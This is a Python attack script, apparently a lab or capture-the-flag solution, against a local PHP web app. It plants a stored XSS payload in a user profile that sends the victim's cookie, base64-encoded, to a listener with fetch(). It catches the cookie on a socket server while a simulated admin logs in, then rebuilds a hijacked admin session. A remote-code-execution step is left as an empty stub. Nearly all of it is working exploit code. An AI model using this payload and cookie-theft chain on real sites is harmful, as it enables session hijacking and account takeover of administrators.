import requests
import socket
import base64
import threading
import time
from playwright.sync_api import sync_playwright

def login_bypass():
    s = requests.Session()
    s.post(
        f"http://127.0.0.1:8000/login.php",
        data={"username": "user1", "password": "user1"},
        allow_redirects=False,
    )
    return s

#Zapravo moramo simulirati browser, nije dovoljno samo poslati login request kao admin
#pip install playwright
#playwright install chromium
#Morate ovo raditi zao mi je :(
def _admin_login():
    time.sleep(2)
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        page.goto("http://127.0.0.1:8000/login.php")
        page.fill('input[name="username"]', "admin")
        page.fill('input[name="password"]', "admin")
        page.click('input[type="submit"]')

        page.wait_for_timeout(2000)

        browser.close()
    print("Admin visited the page")


def privilege_escalation(session):
    print("PRIVILEGE ESCALATION")
    payload = "<img src='-1' onerror=\"fetch('http://127.0.0.1:8001/'+btoa(document.cookie))\"/>"

    session.post(f"http://127.0.0.1:8000/profile.php", data={"description": payload})
    print("XSS planted, waiting for admin to log in")

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 8001))
    srv.listen()
    print("Started server")

    admin_thread = threading.Thread(target=_admin_login)
    admin_thread.start()

    #Cek da se admin uloguje
    sock_c, _ = srv.accept()
    request = sock_c.recv(4096)
    #dekoduj kolacic
    cookie = base64.b64decode(request.split(b" ")[1][1:]).decode()
    sock_c.close()
    srv.close()

    admin_session = requests.Session()
    name, value = cookie.split("=", 1)
    admin_session.cookies.set(name.strip(), value.strip())
    print(f"admin cookie: {cookie}")
    return admin_session

def rce(admin_session):
    return

if __name__ == "__main__":
    session = login_bypass()
    admin_session = privilege_escalation(session)
    rce(admin_session)